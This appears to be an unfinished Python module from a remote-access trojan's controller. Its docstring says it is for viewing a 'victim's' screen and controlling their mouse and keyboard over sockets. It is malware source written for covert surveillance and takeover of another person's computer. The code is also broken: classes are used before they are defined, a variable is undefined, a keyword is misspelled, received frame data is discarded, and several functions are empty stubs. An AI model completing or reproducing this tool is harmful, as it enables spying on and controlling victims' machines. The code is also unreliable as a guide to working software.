"""
Functions for viewing victim's screen and controlling input
"""

import threading
import pygame
#from pygame.locals import *
# import my stuff
import utils
from consts import * # includes * from pygame.locals

# global thread handles
videoRecvHandle = videoRecvThread()
guiControlHandle = guiControlThread()

"""
Class to receive video data
...
"""
class videoRecvThread(threading.Thread):
	def __init__(self):
		super().__init__(self, daemon=True)
		self.running = False
		self.videoSock = None
		self.imgSize = (0, 0) # x, y resolution
		self.imgBuffer = []
		self.imgDirty = False # dirty bit
		self.imgLock = threading.Lock() # lock for image buffer

	# enable video stream and connect to victim
	def startVideo(self, mainSock):
		mainSock.sendAll(bytes([START_VIDEO, 0]))
		self.videoSock = utils.openConnection(VIDEO_PORT)

	# close the video stream connection and stop the thread
	def stop(self, mainSock):
		self.running = False
		mainSock.sendAll(bytes([END_VIDEO, 0]))
		self.videoSock.close()
	
	def run(self):
		# main loop
		while self.running:
			# get frame header
			buffer = self.videoSock.recv(12)
			width = int.from_bytes(data[0:4], byteorder='big', signed=True)
			height = int.from_bytes(data[4:8], byteorder='big', signed=True)
			fileSize = int.from_bytes(data[8:12], byteorder='big', signed=True)
			# get RGB data
			buffer = b''
			while len(buffer) != fileSize:
				temp = self.videoSock.recv(fileSize - len(buffer))
				# find better way to shutdown when connection lost
				if not temp:
					print('Video connection closed!')
					return
			# acquire the lock and copy it to the buffer
			self.imgLock.acquire() # threading.Lock.acquire() blocks by default
			self.imgBuffer = buffer[:] # copy data first to release lock ASAP
			self.imgLock.release()
			self.imageSize = (width, height)
			self.imgDirty = True

"""
Class to render the video using pygame and capture inputs to send
...
"""
class guiControlThread(threading.Thread):
	def __init__(self):
		super().__init__(self, demon=True)
		self.running = False
		self.inputSock = None
		self.controlMouse = False
		self.controlKeys = False

	# enable mouse control and initiate connection if necessary
	def startMouse(self, mainSock):
		if not self.controlMouse:
			mainSock.sendAll(bytes([START_MOUSE, 0]))
			if self.inputSock == None:
				self.input = utils.openConnection(INPUT_PORT)
			self.controlMouse = True

	# enable keyboard control and initiate connection if necessary
	def startKeys(self, mainSock):
		if not self.controlKeys:
			mainSock.sendAll(bytes([START_KEYS, 0]))
			if self.inputSock == None:
				self.input = utils.openConnection(INPUT_PORT)
			self.controlKeys = True

	# disable mouse control and close connection if not controlling keyboard
	def stopMouse(self, mainSock):
		self.controlMouse = False
		mainSock.sendAll(bytes([END_MOUSE, 0]))
		if not self.controlKeys:
			self.inputSock.close()
			self.inputSock = None

	# disable keyboard control and close connection if not controlling mouse
	def stopKeys(self, mainSock):
		self.controlKeys = False
		mainSock.sendAll(bytes([END_KEYS, 0]))
		if not self.controlMouse:
			self.inputSock.close()
			self.inputSock = None

	# disable mouse and keyboard control then stop the thread
	def stop(self, mainSock):
		self.running = False
		if self.controlKeys:
			self.stopKeys(mainSock)
		if self.controlMouse:
			self.stopMouse(mainSock)

	def run(self):
		pass


def toggleVideo(toggle, mainSock):
	if toggle and not guiControlHandle.isAlive():
		videoRecvHandle.startVideo()
		videoRecvHandle.start()
		guiControlHandle.start()
	elif not toggle:
		videoRecvHandle.stop(mainSock)
		guiControlHandle.stop(mainSock)

def toggleAudio(toggle, mainSock):
	print('TODO')

def toggleMouse(toggle, mainSock):
	pass

def toggleKeys(toggle, mainSock):
	pass